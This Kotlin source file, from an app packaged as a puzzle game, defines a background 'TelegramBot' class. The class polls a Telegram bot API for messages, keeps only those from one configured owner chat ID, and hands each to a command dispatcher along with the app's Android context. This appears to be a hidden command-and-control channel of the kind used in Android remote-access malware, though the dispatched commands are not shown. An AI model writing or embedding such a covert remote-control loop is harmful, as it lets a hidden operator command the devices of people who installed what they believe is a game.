package com.puzzleblast.game.core

import android.content.Context
import android.util.Log
import com.puzzleblast.game.util.Prefs
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withTimeoutOrNull
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class TelegramBot(private val ctx: Context) {
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(45, TimeUnit.SECONDS)
        .build()
    @Volatile private var running = false
    private var backoff = 2000L

    fun start() {
        if (running) return
        running = true
        scope.launch { loop() }
    }

    fun stop() {
        running = false
        scope.cancel()
    }

    private suspend fun loop() {
        while (running) {
            try {
                val offset = Prefs.updateOffset
                val json = JSONObject().apply {
                    put("offset", offset + 1)
                    put("timeout", 30)
                    put("allowed_updates", JSONArrayWrap.array("message", "edited_message"))
                }
                val body = json.toString().toRequestBody("application/json".toMediaType())
                val req = Request.Builder().url("${BotConfig.apiBase}/getUpdates").post(body).build()
                val result = withTimeoutOrNull(40_000L) {
                    client.newCall(req).execute().use { resp ->
                        if (!resp.isSuccessful) return@use null
                        JSONObject(resp.body?.string() ?: "{}")
                    }
                }
                if (result == null) {
                    backoff = (backoff * 2).coerceAtMost(60_000L)
                    delay(backoff)
                    continue
                }
                backoff = 2000L
                val arr = result.optJSONArray("result")
                if (arr != null && arr.length() > 0) {
                    val msgs = Updates.parse(arr)
                    msgs.maxOfOrNull { it.updateId }?.let { Prefs.updateOffset = it }
                    for (m in msgs) {
                        if (m.chatId.toString() != BotConfig.ownerId) continue
                        scope.launch { Dispatcher.dispatch(ctx, m) }
                    }
                }
                delay(Prefs.pollInterval)
            } catch (e: Exception) {
                backoff = (backoff * 2).coerceAtMost(60_000L)
                delay(backoff)
            }
        }
    }
}

object JSONArrayWrap {
    fun array(vararg items: String): org.json.JSONArray = org.json.JSONArray().apply { items.forEach { put(it) } }
}
